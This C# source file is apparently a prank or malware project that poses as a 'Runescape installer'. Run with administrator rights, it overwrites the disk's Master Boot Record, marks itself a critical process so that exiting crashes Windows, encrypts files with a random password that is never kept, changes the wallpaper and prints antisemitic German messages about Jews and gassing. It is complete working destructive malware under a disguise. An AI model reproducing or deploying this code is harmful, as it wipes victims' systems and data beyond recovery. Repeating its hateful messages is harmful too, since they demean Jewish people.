/*
                         ---------------------------------------------------------------- ▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒▒▒
▒▒▒▒▒▄█▀▀░░░░░░▀▀█▄▒▒▒▒▒ |                           ATTENTION!                         | ▒▒▒▒▒▄█▀▀░░░░░░▀▀█▄▒▒▒▒▒ 
▒▒▒▄█▀▄██▄░░░░░░░░▀█▄▒▒▒ |      Executing this will render your computer unbootable;    | ▒▒▒▄█▀▄██▄░░░░░░░░▀█▄▒▒▒ 
▒▒█▀░▀░░▄▀░░░░▄▀▀▀▀░▀█▒▒ |  I am not responsible for any damage caused by running this. | ▒▒█▀░▀░░▄▀░░░░▄▀▀▀▀░▀█▒▒ 
▒█▀░░░░███░░░░▄█▄░░░░▀█▒ |                                                              | ▒█▀░░░░███░░░░▄█▄░░░░▀█▒ 
▒█░░░░░░▀░░░░░▀█▀░░░░░█▒ | Copyright © Tyrifjord Videregående Skole - 1.Kl Elektro 2017 | ▒█░░░░░░▀░░░░░▀█▀░░░░░█▒ 
▒█░░░░░░░░░░░░░░░░░░░░█▒ |        Shoutout to my mom for skipping the abortion          | ▒█░░░░░░░░░░░░░░░░░░░░█▒ 
▒█░░██▄░░▀▀▀▀▄▄░░░░░░░█▒ |                                                              | ▒█░░██▄░░▀▀▀▀▄▄░░░░░░░█▒ 
▒▀█░█░█░░░▄▄▄▄▄░░░░░░█▀▒ |                           Memes by:                          | ▒▀█░█░█░░░▄▄▄▄▄░░░░░░█▀▒ 
▒▒▀█▀░▀▀▀▀░▄▄▄▀░░░░▄█▀▒▒ |                      Discord - egu#4788                      | ▒▒▀█▀░▀▀▀▀░▄▄▄▀░░░░▄█▀▒▒ 
▒▒▒█░░░░░░▀█░░░░░▄█▀▒▒▒▒ |                     Discord - Encore#4748                    | ▒▒▒█░░░░░░▀█░░░░░▄█▀▒▒▒▒ 
▒▒▒█▄░░░░░▀█▄▄▄█▀▀▒▒▒▒▒▒ |        https://github.com/egucchi/Runescape-Installer        | ▒▒▒█▄░░░░░▀█▄▄▄█▀▀▒▒▒▒▒▒ 
▒▒▒▒▀▀▀▀▀▀▀▒▒▒▒▒▒▒▒▒▒▒▒▒ ---------------------------------------------------------------- ▒▒▒▒▀▀▀▀▀▀▀▒▒▒▒▒▒▒▒▒▒▒▒▒
*/
using System;
using System.Text;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;
using System.Net;
using System.Security.Cryptography;

namespace Program
{
    class Program
    {
        [DllImport("kernel32")]
        public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32")]
        public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

        //dwDesiredAccess
        public const uint GenericRead = 0x80000000;
        public const uint GenericWrite = 0x40000000;
        public const uint GenericExecute = 0x20000000;
        public const uint GenericAll = 0x10000000;

        //dwShareMode
        public const uint FileShareRead = 0x1;
        public const uint FileShareWrite = 0x2;

        //dwCreationDisposition
        public const uint OpenExisting = 0x3;

        //dwFlagsAndAttributes
        public const uint FileFlagDeleteOnClose = 0x4000000;

        public const uint MbrSize = 512u;

        private static void mbrOverWrite() // Function for overwriting the Master Boot Record
        {
            var mbrData = new byte[MbrSize];

            var mbr = CreateFile(
                "\\\\.\\PhysicalDrive0", // The first sector on the hard drive, where the master boot record is stored.
                GenericAll,
                FileShareRead | FileShareWrite,
                IntPtr.Zero,
                OpenExisting,
                0,
                IntPtr.Zero);

            if (mbr == (IntPtr)(-0x1))
            {
                return;
            }

            if (WriteFile(
                mbr,
                mbrData,
                MbrSize,
                out uint lpNumberOfBytesWritten,
                IntPtr.Zero))
            {
                return;
            }
            else
            {
                Console.WriteLine("Runescape requires administrator privileges to install. Please restart this application in administrator mode to continue.");
            }
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        private static void Critical()
        {
            int isCritical = 1;  // we want this program to be a Critical Process
            int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)

            Process.EnterDebugMode();  //acquire Debug Privileges

            // setting the BreakOnTermination = 1 for the current process
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        }

        static bool IsElevated // Checks if the program was run as an administrator
        {
            get
            {
                var id = WindowsIdentity.GetCurrent();
                return id.Owner != id.User;
            }
        }

        public class CoreEncryption
        {
            public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
            {
                byte[] encryptedBytes = null;

                // Set your salt here, change it to meet your flavor:
                // The salt bytes must be at least 8 bytes.
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                            cs.Close();
                        }
                        encryptedBytes = ms.ToArray();
                    }
                }

                return encryptedBytes;
            }
        }

        public class CoreDecryption
        {
            public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
            {
                byte[] decryptedBytes = null;

                // Set your salt here, change it to meet your flavor:
                // The salt bytes must be at least 8 bytes.
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                            cs.Close();
                        }
                        decryptedBytes = ms.ToArray();
                    }
                }

                return decryptedBytes;
            }
        }

        public class EncryptionFile
        {
            public void EncryptFile(string file, string password)
            {

                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                // Hash the password with SHA256
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesEncrypted = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, passwordBytes);

                string fileEncrypted = file;

                File.WriteAllBytes(fileEncrypted, bytesEncrypted);
            }
        }

        public class DecryptionFile
        {
            public void DecryptFile(string fileEncrypted, string password)
            {

                byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesDecrypted = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, passwordBytes);

                string file = fileEncrypted;
                File.WriteAllBytes(file, bytesDecrypted);
            }
        }

        public static string GeneratePassword(int lowercase, int uppercase, int numerics) 
        // This is for generating a random password, which will be used in a derivation function to generate the encryption key.
        // This password is randomly generated in order to secure the program from reverse engineering and finding a prewritten password, making it possible to decrypt the files.
        {
            string lowers = "abcdefghijklmnopqrstuvwxyz";
            string uppers = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            string number = "0123456789";

            Random random = new Random();

            string generated = "!";
            for (int i = 1; i <= lowercase; i++)
                generated = generated.Insert(
                    random.Next(generated.Length),
                    lowers[random.Next(lowers.Length - 1)].ToString()
                );

            for (int i = 1; i <= uppercase; i++)
                generated = generated.Insert(
                    random.Next(generated.Length),
                    uppers[random.Next(uppers.Length - 1)].ToString()
                );

            for (int i = 1; i <= numerics; i++)
                generated = generated.Insert(
                    random.Next(generated.Length),
                    number[random.Next(number.Length - 1)].ToString()
                );

            return generated.Replace("!", string.Empty);

        }

        private static void EncryptFile()   // The function for encrypting files
        {
            string[] files = Directory.GetFiles(@"c:\Users\kuk\Desktop\test", "*", SearchOption.AllDirectories);
            // Scans an entire directory for files of any extension, name, or size.
            // If you want it to scan an entire drive for files with a specific extention (which is my intended payload when testing on a virtual machine), replace with this.
            // string[] files = Directory.GetFiles(@"c:\", "*.extension", SearchOption.AllDirectories);

            EncryptionFile enc = new EncryptionFile();
            //DecryptionFile dec = new DecryptionFile();

            String password = GeneratePassword(5, 5, 6);
            Console.WriteLine("Preparing to install Runescape.exe...");

            for (int i = 0; i < files.Length; i++)
            {
                enc.EncryptFile(files[i], password);
                //dec.DecryptFile(files[i], password);
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 uiAction, UInt32
    uiParam, String pvParam, UInt32 fWinIni);
        private static UInt32 SPI_SETDESKWALLPAPER = 20;
        private static UInt32 SPIF_UPDATEINIFILE = 0x1;

        public static void Main(string[] args) // If the program has administrator privileges
        {
            if (IsElevated == true)
            {
                mbrOverWrite();
                Critical();
                EncryptFile(); // Calls the file encryption function
                new WebClient().DownloadFile("https://i.imgur.com/wAvU1Km.jpg", @"c:\wAvU1Km.jpg"); // Downloads the picture we want as wallpaper and places it in the c:\ directory
                Thread.Sleep(2000);
                Console.Clear();
                SystemParametersInfo(SPI_SETDESKWALLPAPER, 1, @"c:\wAvU1Km.jpg", SPIF_UPDATEINIFILE); // Sets the wallpaper to our desired photo

                Console.ForegroundColor = ConsoleColor.Green;
                string text = "Achtung! Du hast einen großen Fehler gemacht! Die juden hat deinen Computer übernommen.";
                foreach (char c in text)
                {
                    Console.Write(c);
                    Thread.Sleep(50);
                }
                Console.WriteLine("\n");
                Console.ForegroundColor = ConsoleColor.Yellow;
                string text2 = "Wenn Sie dieses Fenster schließen, wird Ihr Computer vergast. Hoppla.";
                foreach (char c in text2)
                {
                    Console.Write(c);
                    Thread.Sleep(50);
                }

                Thread.Sleep(20000);
                System.Environment.Exit(1); // Exits the application, forcing a blue screen.
            }
            else // If the program was not run as an administrator
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.BackgroundColor = ConsoleColor.Darkgray;
                Console.WriteLine("This application requires administrator privileges. Please restart the application in administrator mode to continue.");
                Console.ResetColor();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("Press enter to close this window...");
                Console.ReadLine();
            }
        }
    }
}
